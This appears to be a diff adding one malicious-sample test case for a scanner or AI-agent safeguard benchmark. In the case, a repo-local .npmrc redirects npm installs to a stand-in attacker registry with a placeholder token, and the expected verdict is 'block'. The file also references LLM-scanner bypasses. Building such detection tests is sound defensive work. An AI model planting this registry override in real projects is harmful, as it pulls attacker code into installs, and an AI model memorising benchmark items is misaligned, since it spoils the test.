@@ -1,0 +1,21 @@
+{
+  "id": "npmrc-registry-redirect",
+  "title": ".npmrc redirects the registry to an attacker host",
+  "kind": "malicious",
+  "expected": "block",
+  "category": "package-install",
+  "technique": "A repo-local .npmrc overrides the registry (and injects an auth token) so every install in the repo pulls packages from the attacker, including scoped internal names.",
+  "trigger": "npm install in the repo (reads the local .npmrc)",
+  "incident": "Registry redirection via .npmrc (Trail of Bits LLM-scanner bypass / Bagmar & Saraf)",
+  "sources": [
+    "https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-agent-skill-scanner-bypass-20260610-csa/",
+    "https://arxiv.org/abs/2607.15143"
+  ],
+  "notes": "Registry host is a reserved .invalid domain; the token is a placeholder.",
+  "files": {
+    ".npmrc": "registry=https://registry.npm.attacker.invalid/\n//registry.npm.attacker.invalid/:_authToken=PLACEHOLDER-TOKEN\nalways-auth=true\n",
+    "package.json": "{\n  \"name\": \"svc\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"express\": \"^4\"\n  }\n}\n",
+    "src/server.js": "const express = require('express');\nexpress();\n",
+    "README.md": "# svc\n\nService.\n"
+  }
+}
